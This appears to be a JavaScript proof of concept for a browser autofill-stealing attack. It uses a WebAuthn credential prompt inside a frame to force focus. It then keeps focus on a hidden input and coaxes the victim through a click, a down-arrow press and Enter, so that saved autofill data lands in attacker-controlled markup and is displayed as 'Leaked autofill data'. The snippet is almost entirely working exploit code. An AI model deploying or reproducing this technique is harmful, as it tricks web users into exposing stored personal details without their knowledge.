const forceFocus = () => {
  // force focus to the tab
  frame.contentWindow.navigator.credentials.create({
    publicKey: {
      rp: {
        name: "Acme",
        id: new URL(location.href).hostname
      },
      user: {
        id: new Uint8Array(16),
        name: "1337",
        displayName: "123456"
      },
      pubKeyCredParams: [{
        type: "public-key",
        alg: -7
      }],
      challenge: new Uint8Array([0x00]).buffer,
      authenticatorSelection: {
        residentKey: "preferred"
      },
      authenticatorSelection: {
        "residentKey": "preferred",
        "requireResidentKey": false,
        "userVerification": "required"
      }
    }
  });
  setTimeout(() => {
    frame.remove();
  }, 700); // might need to increase this
};

localStorage.setItem('step', 'step1');
const linkInterval = setInterval(() => {
  link.focus();
}, 100);

link.onclick = () => {
  console.log('linkclick');
  instructions.innerText = 'Wait...';
  clearInterval(linkInterval);
  setTimeout(() => {
    forceFocus();
  }, 400);
  setTimeout(() => {
    setInterval(() => {
      targetInput.focus();
    }, 100);
    localStorage.setItem('step', 'step2');
    instructions.innerText = 'Now press the down arrow.';
  }, 1000);
};

onkeydown = e => {
  if (e.key === 'ArrowDown') {
    localStorage.setItem('step', 'step3');
    instructions.innerText = 'Last step - press Enter!';
  }
};

targetInput.onchange = () => {
  instructions.innerText = 'Leaked autofill data:';
  document.querySelector('style').remove();
};